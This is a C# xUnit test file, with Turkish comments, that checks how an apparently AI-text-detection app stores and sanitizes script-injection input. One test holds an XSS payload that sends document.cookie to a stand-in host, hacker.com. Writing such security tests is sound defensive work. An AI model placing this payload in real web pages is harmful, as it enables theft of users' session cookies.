using Microsoft.EntityFrameworkCore;
using TextHunter.Data;
using TextHunter.Models;
using TextHunter.Services;
using Xunit;

namespace TextHunter.Tests
{
    public class SecurityIntegrationTests
    {
        private AppDbContext GetDatabaseContext()
        {
            var options = new DbContextOptionsBuilder<AppDbContext>()
                .UseInMemoryDatabase(databaseName: Guid.NewGuid().ToString())
                .Options;
            return new AppDbContext(options);
        }

 
        [Fact]

        public async Task Prediction_Post_ShouldHandle_ScriptInjection()
        {
            // ARRANGE: Zararlı bir script içeren metin hazırla
            using var context = GetDatabaseContext();
            string hackerScript = "<script>alert('XSS Attack!'); fetch('http://hacker.com/steal?cookie=' + document.cookie);</script>";

            var resultEntity = new PredictionResultEntity
            {
                InputText = hackerScript, // Scripti veritabanına kaydetmeyi deniyoruz
                ModelName = "naive_bayes_bow",
                Prediction = "Human",
                AIProbability = 0.1,
                HumanProbability = 0.9
            };

            // ACT: Veritabanına kaydet
            context.PredictionResults.Add(resultEntity);
            await context.SaveChangesAsync();

            // ASSERT: Veritabanından geri çek ve içeriği kontrol et
            var savedData = await context.PredictionResults.FirstOrDefaultAsync();

            Assert.NotNull(savedData);
            // Beyaz Kutu Sorusu: Veri olduğu gibi mi kaydedildi, yoksa temizlendi mi?
            Assert.Equal(hackerScript, savedData.InputText);
        }

        [Fact]
        public void Sanitizer_Should_Remove_Script_Tags()
        {
            // ARRANGE
            var sanitizer = new InputSanitizerService();
            string maliciousInput = "<script>alert('hack');</script>Merhaba Dünya";

            // ACT
            string result = sanitizer.Sanitize(maliciousInput);

            // ASSERT: Script etiketleri silinmiş ve sadece temiz metin kalmış mı?
            Assert.DoesNotContain("<script>", result);
            Assert.Equal("Merhaba D&#252;nya", result.Trim());
        }

    }
}